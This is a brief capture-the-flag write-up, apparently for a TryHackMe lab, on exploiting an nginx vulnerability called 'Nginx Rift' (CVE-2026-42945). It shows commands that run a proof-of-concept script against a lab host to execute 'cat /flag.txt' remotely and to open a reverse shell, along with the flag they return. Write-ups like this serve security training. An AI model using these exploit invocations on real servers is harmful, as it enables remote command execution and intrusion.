# CVE-2026-42945: Nginx Rift 

## Step 1: Check the Target
```bash
sudo docker ps
```
Found nginx running on port 19321.

## Step 2: Find the Exploit
```bash
find / -name "poc.py"
```
Located at `/opt/nginx-rift-build/poc.py`

## Step 3: Run the Hack
```bash
python3 poc.py --host 10.48.184.95 --port 19321 --cmd "cat /flag.txt"
```

**Result:**
```
THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}
```

## Step 4: Get a Reverse Shell
```bash
python3 poc.py --host 10.48.184.95 --port 19321 --shell
```
Wait for the connection, then you can run command on the server:

```bash
cat /flag.txt
```
```
THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}
```

## Final Flag
`THM{18_y34r_5t4t3_m15m4tch_rip5_th3_h34p}`
